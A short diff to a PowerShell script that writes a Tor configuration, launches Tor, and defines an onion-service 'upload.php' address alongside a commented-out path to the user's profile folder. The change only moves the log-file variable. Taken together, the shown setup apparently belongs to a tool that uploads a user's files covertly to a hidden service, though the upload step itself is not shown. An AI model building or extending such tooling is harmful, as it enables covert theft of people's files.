@@ -6,11 +6,11 @@ $curlPath = "$drive\curl\curl.exe"
 # $userPath = [Environment]::GetFolderPath("UserProfile")
 $userPath = "$drive\test"
 $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion/upload.php"
-
+$logFile = "$drive\tor.log"
 Set-Content -Path $torrcPath -Value @"
 SocksPort 9050
 ClientOnionAuthDir $drive\tor\auth
-Log notice file tor.log
+Log notice file $logFile
 "@
 
 # Start Tor
@@ -20,7 +20,7 @@ $torProcess = Start-Process -FilePath $torPath -ArgumentList "-f `"$torrcPath`""
 $bootstrapped = $false
 $maxWait = 30
 $elapsed = 0
-$logFile = "$drive\tor.log"
+
 
 while (-not $bootstrapped -and $elapsed -lt $maxWait) {
     Start-Sleep -Seconds 1
